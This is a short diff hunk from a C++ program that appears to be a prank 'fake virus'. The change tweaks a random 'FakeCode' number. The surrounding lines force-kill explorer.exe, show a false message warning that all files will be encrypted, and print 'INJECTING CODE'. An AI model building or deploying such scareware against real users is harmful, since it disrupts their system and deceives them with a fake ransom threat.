@@ -94,7 +94,7 @@ int main()
 		system("taskkill /IM explorer.exe /F");
 		MessageBoxA(nullptr, "Your Computer is Infected. If you close this window, all your files will be Encrypted. Press OK to enjoy the last 5 minutes of your pc ;)", "skīñś", MB_OK);
 	}
-	int FakeCode = RandomInt(0, 956);
+	int FakeCode = RandomInt(1, 956) * 14;
 	system("color 0C");
 	std::cout << "INJECTING CODE: " << FakeCode << "\n";
 	Sleep(500);
